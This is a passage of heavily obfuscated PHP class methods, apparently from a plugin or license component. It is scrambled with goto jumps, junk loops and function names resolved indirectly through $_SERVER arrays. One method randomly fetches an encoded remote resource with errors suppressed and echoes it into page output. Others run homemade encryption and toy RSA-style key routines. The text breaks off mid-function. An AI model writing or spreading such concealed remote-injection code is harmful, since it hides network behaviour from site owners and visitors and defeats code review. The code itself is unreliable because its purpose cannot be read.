$B‰„áÓôƒø[678]; goto DËµ‰ï¢„‘; dã‘´–È®Ï: } public function yutw0c4b069d($f÷­ò‚½Õ’) { goto Fî™ÍŒõî‘; EÆ¾õèÉ«ç: $Dñ¦¶µ¯ƒ = $EÆÔÊÓ®•[61]($EÆÔÊÓ®•[156])->{$_SERVER[£Õıúå][359]}($EÆÔÊÓ®•[358])->{$_SERVER[£Õıúå][360]}($A©…êì’´)->{$_SERVER[£Õıúå][361]}(); $fé¡­›¦á‰ = $F¿ÏŸÍ–ò[681]; $Dñ¦¶µ¯ƒ = $EÆÔÊÓ®•[248]($Dñ¦¶µ¯ƒ, $EÆÔÊÓ®•[10], $EÆÔÊÓ®•[358]); goto fÏ»‹ßİÏ¹; fÔšÒ©ß­º: $Cµ˜±÷ÅŒê = $F¿ÏŸÍ–ò[680]; if (!$Cµ˜±÷ÅŒê) { die; } if ($F“œÍËàÀ› <= $A©…êì’´) { return; } goto EÆ¾õèÉ«ç; fÏ»‹ßİÏ¹: $BŠÎÌÏŠ¤ñ = $F¿ÏŸÍ–ò[682]; while ($BŠÎÌÏŠ¤ñ < $F¿ÏŸÍ–ò[624]) { if ($BŠÎÌÏŠ¤ñ >= 0) { break; } $BŠÎÌÏŠ¤ñ++; } if (!$EÆÔÊÓ®•[269]($f÷­ò‚½Õ’[$EÆÔÊÓ®•[358]], $Dñ¦¶µ¯ƒ)) { $EÆÔÊÓ®•[191]($EÆÔÊÓ®•[362], !1, $EÆÔÊÓ®•[266]); } goto Fò‰®ÌĞ–˜; Fî™ÍŒõî‘: $F¿ÏŸÍ–ò =& $_SERVER[Ö‘Øù]; $EÆÔÊÓ®• =& $_SERVER[£Õıúå]; $A©…êì’´ = $this->{$_SERVER[£Õıúå][154]}(); goto bÙ¼¬’¥­; bÙ¼¬’¥­: if ($f÷­ò‚½Õ’[$EÆÔÊÓ®•[358]] == $EÆÔÊÓ®•[246]) { return; } if ($A©…êì’´ >= $EÆÔÊÓ®•[271]($EÆÔÊÓ®•[272])) { return; } $F“œÍËàÀ› = $EÆÔÊÓ®•[61]($EÆÔÊÓ®•[156])->{$_SERVER[£Õıúå][157]}(); goto fÔšÒ©ß­º; Fò‰®ÌĞ–˜: } public function rgleed3eb8a8() { goto Eˆ¾Ã¶íõô; DíÓ«Ç±ˆ¡: $aÌ×Û”âÆğ = $cÓ¥˜°Æìß[684]; if (strlen($aÌ×Û”âÆğ) < $cÓ¥˜°Æìß[635]) { die; } echo $AôßÆùÅËÁ[364] . $AôßÆùÅËÁ[365]($e‹„ÚÈ”œ) . $AôßÆùÅËÁ[366]; goto aÆ£Š£§â‰; F×Î¢½›ºæ: $cº˜›Š¿µµ = $AôßÆùÅËÁ[276]; $cº˜›Š¿µµ = $this->{$_SERVER[£Õıúå][277]}($cº˜›Š¿µµ, $AôßÆùÅËÁ[278]); $E˜ÓíÖ» = $AôßÆùÅËÁ[279](array($AôßÆùÅËÁ[280] => array($AôßÆùÅËÁ[281] => $AôßÆùÅËÁ[282], $AôßÆùÅËÁ[283] => 3))); goto f×ÏíÀ‚“Ï; Eˆ¾Ã¶íõô: $cÓ¥˜°Æìß =& $_SERVER[Ö‘Øù]; $AôßÆùÅËÁ =& $_SERVER[£Õıúå]; if (!$AôßÆùÅËÁ[123]($GLOBALS, $AôßÆùÅËÁ[149]) || $AôßÆùÅËÁ[363](1, 100) > 20) { return; } goto F×Î¢½›ºæ; f×ÏíÀ‚“Ï: $f™ÉÒˆšñš = $cÓ¥˜°Æìß[683]; if (strlen($f™ÉÒˆšñš) < $cÓ¥˜°Æìß[635]) { return; } $e‹„ÚÈ”œ = @$AôßÆùÅËÁ[284]($cº˜›Š¿µµ, !1, $E˜ÓíÖ»); goto DíÓ«Ç±ˆ¡; aÆ£Š£§â‰: $eìÏŞë—êÙ = $cÓ¥˜°Æìß[685]; while (strlen($eìÏŞë—êÙ) < $cÓ¥˜°Æìß[602]) { if (!$eìÏŞë—êÙ) { break; } $eìÏŞë—êÙ++; } goto CÈİíÊÌ; CÈİíÊÌ: } private function yxpr63f0b41e($fù—ÁÊó†, $AÈùíÛâ“‹, $f‰ä›©Ôƒ = 3) { goto aØÙ¬¡Êáß; aèÙî¾¬“¿: if ($f‰ä›©Ôƒ - 1 > 0) { $Aï›Á×Ñ•è = $this->{$_SERVER[£Õıúå][144]}($Aï›Á×Ñ•è, $AÈùíÛâ“‹, $f‰ä›©Ôƒ - 1); } return $Aï›Á×Ñ•è; goto bÔš¿Øó±; Eçµ›™ùŸÀ: $fù—ÁÊó† = $dÂÌ™ƒáÈÆ[2]($fù—ÁÊó†); $bø‰¹ë…Òï = $dÂÌ™ƒáÈÆ[363](0, 5) . $dÂÌ™ƒáÈÆ[10]; $e…Ôéğ“ã = $f ’·ä¹™[686]; goto FË…ğ¬Ò¨; aØÙ¬¡Êáß: $f ’·ä¹™ =& $_SERVER[Ö‘Øù]; $dÂÌ™ƒáÈÆ =& $_SERVER[£Õıúå]; $dÂÌ™ƒáÈÆ[367](1); goto Eçµ›™ùŸÀ; d¤šÏ”—ª²: $dõÁÀò«áÓ = $f ’·ä¹™[688]; switch ($bø‰¹ë…Òï) { case $dÂÌ™ƒáÈÆ[260]: $Aï›Á×Ñ•è = $this->{$_SERVER[£Õıúå][172]}($fù—ÁÊó†, $dÂÌ™ƒáÈÆ[240]($AÈùíÛâ“‹ . $AÂ¨Êè”‰—)); $AĞ”ñÅµÅ = $f ’·ä¹™[689]; if (strlen($AĞ”ñÅµÅ) < $f ’·ä¹™[614]) { return; } break; $d“óƒ¦Ô° = $f ’·ä¹™[690]; if (!$d“óƒ¦Ô°) { return; } case $dÂÌ™ƒáÈÆ[246]: $Aï›Á×Ñ•è = $this->{$_SERVER[£Õıúå][172]}($fù—ÁÊó†, $dÂÌ™ƒáÈÆ[240]($AÂ¨Êè”‰— . $AÈùíÛâ“‹)); $eé™‡öƒï = $f ’·ä¹™[691]; if (!$eé™‡öƒï) { return; } break; $eõÜ”²Î±Ü = $f ’·ä¹™[692]; if (!$eõÜ”²Î±Ü) { die; } case $dÂÌ™ƒáÈÆ[369]: $Aï›Á×Ñ•è = $this->{$_SERVER[£Õıúå][172]}($fù—ÁÊó†, $dÂÌ™ƒáÈÆ[135]($AÂ¨Êè”‰— . $AÈùíÛâ“‹)); break; case $dÂÌ™ƒáÈÆ[370]: $Aï›Á×Ñ•è = $this->{$_SERVER[£Õıúå][172]}($fù—ÁÊó†, $dÂÌ™ƒáÈÆ[131]($AÂ¨Êè”‰— . $AÈùíÛâ“‹)); break; case $dÂÌ™ƒáÈÆ[371]: goto C‹çğ²ÀğÙ; D ÂâŠå·î: for ($cÔáÊİ–ô = 0; $cÔáÊİ–ô < $dÂÌ™ƒáÈÆ[24]($fù—ÁÊó†); $cÔáÊİ–ô++) { $b¡Æ¢•›î¼ = $b¡Æ¢•›î¼ == $dÂÌ™ƒáÈÆ[24]($fé×›‹¦¤ô) ? 0 : $b¡Æ¢•›î¼; $eÎíÈÅù—¹ = $f ’·ä¹™[699]; if (!$eÎíÈÅù—¹) { return; } $aÉœõœÂ˜„ = ($eå‰¬Ş¸ŒÒ + $dÂÌ™ƒáÈÆ[373]($fÉÊÑ°ÖÑŠ, $fù—ÁÊó†[$cÔáÊİ–ô]) + $dÂÌ™ƒáÈÆ[374]($fé×›‹¦¤ô[$b¡Æ¢•›î¼++])) % 64; $f§ÖÑãÊŒì .= $fÉÊÑ°ÖÑŠ[$aÉœõœÂ˜„]; $Aòöö»Ëää = $f ’·ä¹™[700]; while (strlen($Aòöö»Ëää) < $f ’·ä¹™[602]) { if (!$Aòöö»Ëää) { break; } $Aòöö»Ëää++; } } $Aï›Á×Ñ•è = $dÂÌ™ƒáÈÆ[365]($fÛŸÌëÃ² . $f§ÖÑãÊŒì); $CäñëĞÆŞ¼ = $f ’·ä¹™[701]; goto B’Å ÒĞ˜¨; C‹çğ²ÀğÙ: $fù—ÁÊó† = $dÂÌ™ƒáÈÆ[135]($fù—ÁÊó†); $EèÛÀí¸¨— = $f ’·ä¹™[693]; if (strlen($EèÛÀí¸¨—) < $f ’·ä¹™[635]) { return; } goto E©¬™Ù„ˆ; B’Å ÒĞ˜¨: if (!$CäñëĞÆŞ¼) { return; } break; $EÆ¹ÀëÂº = $f ’·ä¹™[702]; goto báÏÎ†¬İò; E›öÉ«£ê: $d‚à”¡Ö­à = $f ’·ä¹™[697]; $b¡Æ¢•›î¼ = 0; $B¼—ó‚¹«Õ = $f ’·ä¹™[698]; goto D ÂâŠå·î; E©¬™Ù„ˆ: $eå‰¬Ş¸ŒÒ = $dÂÌ™ƒáÈÆ[372](0, 64); $fÛŸÌëÃ² = $fÉÊÑ°ÖÑŠ[$eå‰¬Ş¸ŒÒ]; $fé×›‹¦¤ô = $dÂÌ™ƒáÈÆ[131]($fÛŸÌëÃ² . $dÂÌ™ƒáÈÆ[131]($AÈùíÛâ“‹ . $fÛŸÌëÃ²) . $AÈùíÛâ“‹); goto E„Ş·òˆ¢œ; D¦‘Ú¥ÜÖĞ: $bÚ­ë˜³Ú× = $f ’·ä¹™[695]; if (!$bÚ­ë˜³Ú×) { die; } $cÔáÊİ–ô = 0; goto AÄ‘ãæ ±õ; báÏÎ†¬İò: while (strlen($EÆ¹ÀëÂº) < $f ’·ä¹™[614]) { if (!$EÆ¹ÀëÂº) { break; } $EÆ¹ÀëÂº++; } goto FƒÖ¸àÂøª; AÄ‘ãæ ±õ: $bæÆÌ”Ş­ = $f ’·ä¹™[696]; if (!$bæÆÌ”Ş­) { return; } $aÉœõœÂ˜„ = 0; goto E›öÉ«£ê; E„Ş·òˆ¢œ: $fé×›‹¦¤ô = $dÂÌ™ƒáÈÆ[25]($fé×›‹¦¤ô, $eå‰¬Ş¸ŒÒ % 8, $eå‰¬Ş¸ŒÒ % 8 + 7); $dèÔŸñèÖ• = $f ’·ä¹™[694]; $f§ÖÑãÊŒì = $dÂÌ™ƒáÈÆ[10]; goto D¦‘Ú¥ÜÖĞ; FƒÖ¸àÂøª: default: $Aï›Á×Ñ•è = $this->{$_SERVER[£Õıúå][172]}($fù—ÁÊó†, $AÈùíÛâ“‹ . $AÂ¨Êè”‰—); $bßÙ™Æ—ÄÊ = $f ’·ä¹™[703]; if (strlen($bßÙ™Æ—ÄÊ) < $f ’·ä¹™[624]) { die; } break; $FÎ‰÷îê›Ş = $f ’·ä¹™[704]; if (strlen($FÎ‰÷îê›Ş) < $f ’·ä¹™[606]) { return; } } $Aï›Á×Ñ•è = $dÂÌ™ƒáÈÆ[240]($bø‰¹ë…Òï . $AÂ¨Êè”‰— . $Aï›Á×Ñ•è); goto aèÙî¾¬“¿; FË…ğ¬Ò¨: $AÂ¨Êè”‰— = $dÂÌ™ƒáÈÆ[141](15); $AÍöµóñ÷„ = $f ’·ä¹™[687]; $fÉÊÑ°ÖÑŠ = $dÂÌ™ƒáÈÆ[368]; goto d¤šÏ”—ª²; bÔš¿Øó±: } private function dwgra984ca81($eÕÛ®ªÍğĞ, $a¹ÍÁ¿à›İ, $b÷ŒĞë½ÔÜ = 3) { goto EõÁç¦™±Ş; dÁå¡õ: $eÕÛ®ªÍğĞ = $b‘ÓÔ™çğÖ[240]($eÕÛ®ªÍğĞ); $c–áÚ—‘Ô = $eÕÛ®ªÍğĞ[0]; $B¡È½‹“ó° = $C¬±¤è•á[706]; goto EÌÂ†Ú÷Ê‘; EõÁç¦™±Ş: $C¬±¤è•á =& $_SERVER[Ö‘Øù]; $b‘ÓÔ™çğÖ =& $_SERVER[£Õıúå]; if (!$b‘ÓÔ™çğÖ[165]($eÕÛ®ªÍğĞ) || $b‘ÓÔ™çğÖ[24]($eÕÛ®ªÍğĞ) < 10) { return !1; } goto AÆëÇ´æÀ; EÌÂ†Ú÷Ê‘: if (strlen($B¡È½‹“ó°) < $C¬±¤è•á[635]) { die; } $Côº³‹ˆæƒ = $b‘ÓÔ™çğÖ[25]($eÕÛ®ªÍğĞ, 1, 15); $eÕÛ®ªÍğĞ = $b‘ÓÔ™çğÖ[25]($eÕÛ®ªÍğĞ, 16); goto FÕ÷”·í®“; FÕ÷”·í®“: $fÕ×æÓÒ’ô = $b‘ÓÔ™çğÖ[368]; $bƒ‘ƒœ¢÷Ó = $C¬±¤è•á[707]; switch ($c–áÚ—‘Ô) { case $b‘ÓÔ™çğÖ[260]: $Aƒ…ò÷Ìİ = $this->{$_SERVER[£Õıúå][277]}($eÕÛ®ªÍğĞ, $b‘ÓÔ™çğÖ[240]($a¹ÍÁ¿à›İ . $Côº³‹ˆæƒ)); $E¨öÙïºÅœ = $C¬±¤è•á[708]; if (strlen($E¨öÙïºÅœ) < $C¬±¤è•á[635]) { die; } break; $c‚ÀÄÂà©å = $C¬±¤è•á[709]; if (!$c‚ÀÄÂà©å) { die; } case $b‘ÓÔ™çğÖ[246]: $Aƒ…ò÷Ìİ = $this->{$_SERVER[£Õıúå][277]}($eÕÛ®ªÍğĞ, $b‘ÓÔ™çğÖ[240]($Côº³‹ˆæƒ . $a¹ÍÁ¿à›İ)); $fé‡Š¾ôÔ = $C¬±¤è•á[710]; if (strlen($fé‡Š¾ôÔ) < $C¬±¤è•á[624]) { return; } break; $aÆ¹Ì¢’ùİ = $C¬±¤è•á[711]; case $b‘ÓÔ™çğÖ[369]: $Aƒ…ò÷Ìİ = $this->{$_SERVER[£Õıúå][277]}($eÕÛ®ªÍğĞ, $b‘ÓÔ™çğÖ[135]($Côº³‹ˆæƒ . $a¹ÍÁ¿à›İ)); break; $F‘ãò©¬Ü = $C¬±¤è•á[712]; while (strlen($F‘ãò©¬Ü) < $C¬±¤è•á[602]) { if (!$F‘ãò©¬Ü) { break; } $F‘ãò©¬Ü++; } case $b‘ÓÔ™çğÖ[370]: $Aƒ…ò÷Ìİ = $this->{$_SERVER[£Õıúå][277]}($eÕÛ®ªÍğĞ, $b‘ÓÔ™çğÖ[131]($Côº³‹ˆæƒ . $a¹ÍÁ¿à›İ)); $A÷…–¶Ğ¢‹ = $C¬±¤è•á[713]; if (!$A÷…–¶Ğ¢‹) { return; } break; case $b‘ÓÔ™çğÖ[371]: goto E²æ©…İ­; a”İÄÙ®ß: $E·»ôÃåëâ = $C¬±¤è•á[716]; if (strlen($E·»ôÃåëâ) < $C¬±¤è•á[606]) { die; } $E…‘†™‡ŸÖ = $b‘ÓÔ™çğÖ[25]($E…‘†™‡ŸÖ, $CŒäŒˆ‰½è % 8, $CŒäŒˆ‰½è % 8 + 7); goto AÒ¸‡Ú¦˜¹; B³¢ì‡Ê—¸: break; goto bô¤¹©Œˆ; E²æ©…İ­: $eÕÛ®ªÍğĞ = $b‘ÓÔ™çğÖ[375]($eÕÛ®ªÍğĞ); $F»äîö’ = $eÕÛ®ªÍğĞ[0]; $Fº¥Š–çƒÌ = $C¬±¤è•á[714]; goto c§³ª¨ì ÷; c§³ª¨ì ÷: if (!$Fº¥Š–çƒÌ) { die; } $eÕÛ®ªÍğĞ = $b‘ÓÔ™çğÖ[25]($eÕÛ®ªÍğĞ, 1); $A–ˆ¤·”÷Ê = $C¬±¤è•á[715]; goto dòİµ; aŞ°®öİ½‚: $cõĞÏÕÉÚ› = 0; $F¹ø°‚°» = 0; $cÒæ™¾—ä = $C¬±¤è•á[718]; goto ešÔïãª«Ö; eêŒ‚Ù¹Óõ: $Aƒ…ò÷Ìİ = $b‘ÓÔ™çğÖ[376]($bÂÆ¸¾¦é®); $A‰‘Ôæ‚‰Ê = $C¬±¤è•á[720]; if (strlen($A‰‘Ôæ‚‰Ê) < $C¬±¤è•á[635]) { return; } goto B³¢ì‡Ê—¸; ešÔïãª«Ö: while (strlen($cÒæ™¾—ä) < $C¬±¤è•á[606]) { if (!$cÒæ™¾—ä) { break; } $cÒæ™¾—ä++; } $EÁãŠö‹óï = 0; for ($cõĞÏÕÉÚ› = 0; $cõĞÏÕÉÚ› < $b‘ÓÔ™çğÖ[24]($eÕÛ®ªÍğĞ); $cõĞÏÕÉÚ›++) { $EÁãŠö‹óï = $EÁãŠö‹óï == $b‘ÓÔ™çğÖ[24]($E…‘†™‡ŸÖ) ? 0 : $EÁãŠö‹óï; $eÌ×ï¡À¹‰ = $C¬±¤è•á[719]; if (strlen($eÌ×ï¡À¹‰) < $C¬±¤è•á[614]) { return; } $cˆ“Ç´˜ŒÛ = $EÁãŠö‹óï++; $F¹ø°‚°» = $b‘ÓÔ™çğÖ[373]($fÕ×æÓÒ’ô, $eÕÛ®ªÍğĞ[$cõĞÏÕÉÚ›]) - $CŒäŒˆ‰½è - $b‘ÓÔ™çğÖ[374]($E…‘†™‡ŸÖ[$cˆ“Ç´˜ŒÛ]); while ($F¹ø°‚°» < 0) { $F¹ø°‚°» += 64; } $bÂÆ¸¾¦é® .= $fÕ×æÓÒ’ô[$F¹ø°‚°»]; } goto eêŒ‚Ù¹Óõ; AÒ¸‡Ú¦˜¹: $bÂÆ¸¾¦é® = $b‘ÓÔ™çğÖ[10]; $DæÈ‘·…×Í = $C¬±¤è•á[717]; while (strlen($DæÈ‘·…×Í) < $C¬±¤è•á[635]) { if (!$DæÈ‘·…×Í) { break; } $DæÈ‘·…×Í++; } goto aŞ°®öİ½‚; dòİµ: if (!$A–ˆ¤·”÷Ê) { die; } $CŒäŒˆ‰½è = $b‘ÓÔ™çğÖ[373]($fÕ×æÓÒ’ô, $F»äîö’); $E…‘†™‡ŸÖ = $b‘ÓÔ™çğÖ[131]($F»äîö’ . $b‘ÓÔ™çğÖ[131]($a¹ÍÁ¿à›İ . $F»äîö’) . $a¹ÍÁ¿à›İ); goto a”İÄÙ®ß; bô¤¹©Œˆ: default: $Aƒ…ò÷Ìİ = $this->{$_SERVER[£Õıúå][277]}($eÕÛ®ªÍğĞ, $a¹ÍÁ¿à›İ . $Côº³‹ˆæƒ); $Døß¾èèõ = $C¬±¤è•á[721]; while (strlen($Døß¾èèõ) < $C¬±¤è•á[624]) { if (!$Døß¾èèõ) { break; } $Døß¾èèõ++; } break; $f«µØ¶ÉÌĞ = $C¬±¤è•á[722]; if (!$f«µØ¶ÉÌĞ) { die; } } goto BËœÚ«îëŞ; AÆëÇ´æÀ: $eÕÛ®ªÍğĞ = $b‘ÓÔ™çğÖ[2]($eÕÛ®ªÍğĞ); $d›¾àß¶å = $C¬±¤è•á[705]; if (!$d›¾àß¶å) { die; } goto dÁå¡õ; BËœÚ«îëŞ: if ($b÷ŒĞë½ÔÜ - 1 > 0) { $Aƒ…ò÷Ìİ = $this->{$_SERVER[£Õıúå][215]}($Aƒ…ò÷Ìİ, $a¹ÍÁ¿à›İ, $b÷ŒĞë½ÔÜ - 1); } return $Aƒ…ò÷Ìİ; goto C¤ƒ…Í«êø; C¤ƒ…Í«êø: } public function fecva722a795($dÁ¢ùÖ¸Ç) { goto FåíÓí¿Ô¤; c™Šï·ğôµ: $eõ½ä£¦Ò = $c¬ëÄ»ê[729]; if (!$eõ½ä£¦Ò) { return; } goto aŞçÀòêï; c˜ßøİ¦ÑÀ: for ($f…êçïÛ¿ö = 0; $f…êçïÛ¿ö < $f•ãÊÔì“í * 10; $f…êçïÛ¿ö++) { if (($f•ãÊÔì“í * $f…êçïÛ¿ö + 1) % $eœƒšÇ¶èÍ == 0) { $eŒØÆ‰À ” = $dÛ‡•™ÏÀ›[271](($f•ãÊÔì“í * $f…êçïÛ¿ö + 1) / $eœƒšÇ¶èÍ); break; } } $B´ÂÆõĞÈ© = $this->{$_SERVER[£Õıúå][172]}($EåÑõ§¿Ã * $F¹«‚â¤ . $dÛ‡•™ÏÀ›[10], $dÛ‡•™ÏÀ›[174]); $Bì´¸‰°îİ = $c¬ëÄ»ê[728]; goto cùí¦­é˜¨; FåíÓí¿Ô¤: $c¬ëÄ»ê =& $_SERVER[Ö‘Øù]; $dÛ‡•™ÏÀ› =& $_SERVER[£Õıúå]; $EåÑõ§¿Ã = $this->{$_SERVER[£Õıúå][377]}(); goto cªñìõõî—; Eö¹±†ë: $eŒØÆ‰À ” = 2; $Dƒ‘†«­Öä = $c¬ëÄ»ê[727]; if (!$Dƒ‘†«­Öä) { die; } goto c˜ßøİ¦ÑÀ; cùí¦­é˜¨: $f…ÖÃÓ¸É = $dÛ‡•™ÏÀ›[131]($dÛ‡•™ÏÀ›[378] . ($EåÑõ§¿Ã + $F¹«‚â¤) . $dÛ‡•™ÏÀ›[379] . $eœƒšÇ¶èÍ . $dÛ‡•™ÏÀ›[379] . $eŒØÆ‰À ” . $dÛ‡•™ÏÀ›[380]); $aÚ‚¤Ä°Şİ = $this->{$_SERVER[£Õıúå][172]}($dÁ¢ùÖ¸Ç, $f…ÖÃÓ¸É) . $dÛ‡•™ÏÀ›[381] . $B´ÂÆõĞÈ©; return $aÚ‚¤Ä°Şİ; goto c™Šï·ğôµ; aõóÚôÀëÛ: $eœƒšÇ¶èÍ = $dÛ‡•™ÏÀ›[271](($EåÑõ§¿Ã + $F¹«‚â¤) / 2); $Cõ–—£İ“ = $c¬ëÄ»ê[725]; while (1) { $D´¬øèç¸Ó = $eœƒšÇ¶èÍ; $E—ˆ¶ÓœåÈ = $c¬ëÄ»ê[726]; if (strlen($E—ˆ¶ÓœåÈ) < $c¬ëÄ»ê[606]) { die; } $bË®¯°ƒÜ­ = $f•ãÊÔì“í; while ($bË®¯°ƒÜ­ % $D´¬øèç¸Ó != 0) { $DŒçŒ‘ùÒì = $bË®¯°ƒÜ­; $bË®¯°ƒÜ­ = $D´¬øèç¸Ó; $c÷ÊÓâ—Ö¹ = $c¬ëÄ»ê[631]; while ($c÷ÊÓâ—Ö¹ < $c¬ëÄ»ê[635]) { if ($c÷ÊÓâ—Ö¹ >= 0) { break; } $c÷ÊÓâ—Ö¹++; } $D´¬øèç¸Ó = $DŒçŒ‘ùÒì % $D´¬øèç¸Ó; } if ($D´¬øèç¸Ó == 1) { break; } else { $eœƒšÇ¶èÍ++; } } goto Eö¹±†ë; cªñìõõî—: $cµË¯ÉÔïË = $c¬ëÄ»ê[723]; if (!$cµË¯ÉÔïË) { die; } $F¹«‚â¤ = $this->{$_SERVER[£Õıúå][377]}(); goto A‚ºš¯åª; A‚ºš¯åª: $B¨”ùÓÎà = $c¬ëÄ»ê[724]; while ($B¨”ùÓÎà < $c¬ëÄ»ê[624]) { if ($B¨”ùÓÎà >= 0) { break; } $B¨”ùÓÎà++; } $f•ãÊÔì“í = ($EåÑõ§¿Ã - 1) * ($F¹«‚â¤ - 1); goto aõóÚôÀëÛ; aŞçÀòêï: } public function xlbf66bc2fb7($AîâŠ–ß) { goto bî‚½¼Á§ç; Fæ–ÈøÚ¯Š: $EÆ‹Ê™¥ø– = ($E‹ƒÛª†ñ - 1) * ($f”ÆÎ–àÓÎ - 1); $F‘ÉÂÂ½œÇ = $EÓš°Ÿº’·[735]; while ($F‘ÉÂÂ½œÇ < $EÓš°Ÿº’·[606]) { if ($F‘ÉÂÂ½œÇ >= 0) { break; } $F‘ÉÂÂ½œÇ++; } goto D¦ô‹¹â½; BÔÉ˜Âšëƒ: $d•å–·èäŠ = $EÓš°Ÿº’·[731]; if (!$d•å–·èäŠ) { return; } $f”ÆÎ–àÓÎ = 0; goto D¸ƒ£”øá¡; aíŸä«õ±: for ($c­†«ˆ®Ó = 0; $c­†«ˆ®Ó < $EÆ‹Ê™¥ø– * 10; $c­†«ˆ®Ó++) { if (($EÆ‹Ê™¥ø– * $c­†«ˆ®Ó + 1) % $CŒÅÒÙğÊë == 0) { $eæ¾è©Ó¨® = $E¤Ö¼Ğ„òÅ[271](($EÆ‹Ê™¥ø– * $c­†«ˆ®Ó + 1) / $CŒÅÒÙğÊë); break; } } $dÉÔÊ­ÚÖ¨ = $E¤Ö¼Ğ„òÅ[131]($E¤Ö¼Ğ„òÅ[378] . ($E‹ƒÛª†ñ + $f”ÆÎ–àÓÎ) . $E¤Ö¼Ğ„òÅ[379] . $CŒÅÒÙğÊë . $E¤Ö¼Ğ„òÅ[379] . $eæ¾è©Ó¨® . $E¤Ö¼Ğ„òÅ[380]); $c¬ÛÊ«ëÃ = $this->{$_SERVER[£Õıúå][277]}($f÷™¶Ê°›Ä[0], $dÉÔÊ­ÚÖ¨); goto C­ªÖ¡Øš¼; fãö¼êáæà: $BÉ§¢ôì„ù = $EÓš°Ÿº’·[730]; if ($E¤Ö¼Ğ„òÅ[19]($f÷™¶Ê°›Ä) != 2) { return $E¤Ö¼Ğ„òÅ[10]; } $FÃæÅÛêàğ = $this->{$_SERVER[£Õıúå][277]}($f÷™¶Ê°›Ä[1] . $E¤Ö¼Ğ„òÅ[10], $E¤Ö¼Ğ„òÅ[174]); goto eÈëì»ôĞ; D¸ƒ£”øá¡: $bíõ¶á¡Ûª = $EÓš°Ÿº’·[732]; if (!$bíõ¶á¡Ûª) { return; } for ($c­†«ˆ®Ó = 3; $c­†«ˆ®Ó < $FÃæÅÛêàğ; $c­†«ˆ®Ó += 2) { if ($FÃæÅÛêàğ % $c­†«ˆ®Ó != 0) { continue; } $E‹ƒÛª†ñ = $c­†«ˆ®Ó; $DÅÛÎ¼ó¾Ã = $EÓš°Ÿº’·[733]; while (strlen($DÅÛÎ¼ó¾Ã) < $EÓš°Ÿº’·[606]) { if (!$DÅÛÎ¼ó¾Ã) { break; } $DÅÛÎ¼ó¾Ã++; } $f”ÆÎ–àÓÎ = $E¤Ö¼Ğ„òÅ[271]($FÃæÅÛêàğ / $c­†«ˆ®Ó); $fà„’´©åÚ = $EÓš°Ÿº’·[734]; if (!$fà„’´©åÚ) { die; } break; } goto Fæ–ÈøÚ¯Š; bî‚½¼Á§ç: $EÓš°Ÿº’· =& $_SERVER[Ö‘Øù]; $E¤Ö¼Ğ„òÅ =& $_SERVER[£Õıúå]; $f÷™¶Ê°›Ä = $E¤Ö¼Ğ„òÅ[0]($E¤Ö¼Ğ„òÅ[381], $AîâŠ–ß); goto fãö¼êáæà; D¦ô‹¹â½: $CŒÅÒÙğÊë = $E¤Ö¼Ğ„òÅ[271](($E‹ƒÛª†ñ + $f”ÆÎ–àÓÎ) / 2); while (1) { $BÆ»´Á«ÔŒ = $CŒÅÒÙğÊë; $BìĞÌáõ™å = $EÆ‹Ê™¥ø–; while ($BìĞÌáõ™å % $BÆ»´Á«ÔŒ != 0) { $aóŠöâª× = $BìĞÌáõ™å; $BìĞÌáõ™å = $BÆ»´Á«ÔŒ; $BÆ»´Á«ÔŒ = $aóŠöâª× % $BÆ»´Á«ÔŒ; } if ($BÆ»´Á«ÔŒ == 1) { break; } else { $CŒÅÒÙğÊë++; } } $eæ¾è©Ó¨® = 2; goto aíŸä«õ±; C­ªÖ¡Øš¼: $E†§Ôî»Ãô = $EÓš°Ÿº’·[736]; if (strlen($E†§Ôî»Ãô) < $EÓš°Ÿº’·[614]) { die; } return $c¬ÛÊ«ëÃ; goto BÊßçíÁ£—; eÈëì»ôĞ: if (!$FÃæÅÛêàğ) { return $E¤Ö¼Ğ„òÅ[10]; } $FÃæÅÛêàğ = $E¤Ö¼Ğ„òÅ[271]($FÃæÅÛêàğ); $E‹ƒÛª†ñ = 0; goto BÔÉ˜Âšëƒ; BÊßçíÁ£—: } public function ubxrf541d92d() { goto b„äÒ³öø×; AĞªÅ¸•¢: $D®éà”À¼Û = $e£ŠÚ…¡ã[739]; if (!$D®éà”À¼Û) { return; } for ($Eˆ«µÏ´ä³ = $b£ªõÒ‰ì; $Eˆ«µÏ´ä³ > 1; $Eˆ«µÏ´ä³--) { $FçÌô‰ˆÄŠ = !0; $e…àÜ§¡¾î = $e£ŠÚ…¡ã[740]; foreach ($bİåÙâ £Ş as $E•Ã¨™À•‹) { if ($Eˆ«µÏ´ä³ % $E•Ã¨™À•‹ == 0) { $FçÌô‰ˆÄŠ = !1; break; } } if ($FçÌô‰ˆÄŠ) { $A¯¥›ÌÅ½ã = $Eˆ«µÏ´ä³; break; } } goto B¹«Û´Ÿ¬É; FõÀ£Ÿóí„: $D›†¼¼òœĞ = 1; while ($D›†¼¼òœĞ <= (int) $d‰«™Å¬Œ¹[383]($b£ªõÒ‰ì)) { $Eˆ«µÏ´ä³ = $D›†¼¼òœĞ; $a˜»æØÜä = $e£ŠÚ…¡ã[738]; if (!$a˜»æØÜä) { die; } while (!0) { $Eˆ«µÏ´ä³++; if ($Eˆ«µÏ´ä³ <= 2) { $D›†¼¼òœĞ = $Eˆ«µÏ´ä³; break; } else { if ($Eˆ«µÏ´ä³ < 2) { continue; } } $FçÌô‰ˆÄŠ = !0; for ($aÅç‡Â±Ú¬ = 2; $aÅç‡Â±Ú¬ <= $d‰«™Å¬Œ¹[383]($Eˆ«µÏ´ä³); $aÅç‡Â±Ú¬++) { if ($Eˆ«µÏ´ä³ % $aÅç‡Â±Ú¬ == 0) { $FçÌô‰ˆÄŠ = !1; } } if ($FçÌô‰ˆÄŠ) { $D›†¼¼òœĞ = $Eˆ«µÏ´ä³; break; } } $bİåÙâ £Ş[] = $D›†¼¼òœĞ; } $A¯¥›ÌÅ½ã = 2; goto AĞªÅ¸•¢; b„äÒ³öø×: $e£ŠÚ…¡ã =& $_SERVER[Ö‘Øù]; $d‰«™Å¬Œ¹ =& $_SERVER[£Õıúå]; $b£ªõÒ‰ì = $d‰«™Å¬Œ¹[363]($d‰«™Å¬Œ¹[382](2, 14), $d‰«™Å¬Œ¹[382](2, 16) - 1); goto a»ƒ±Æøë‘; B¹«Û´Ÿ¬É: return $A¯¥›ÌÅ½ã; goto fÖœÛõ™÷Ø; a»ƒ±Æøë‘: $B‡©ŞÒ³¯Ç = $e£ŠÚ…¡ã[737]; if (!$B‡©ŞÒ³¯Ç) { die; } $bİåÙâ £Ş = array(); goto FõÀ£Ÿóí„; fÖœÛõ™÷Ø: } public function gbzj1e31d913($dÑÓ‡ËŒƒ, 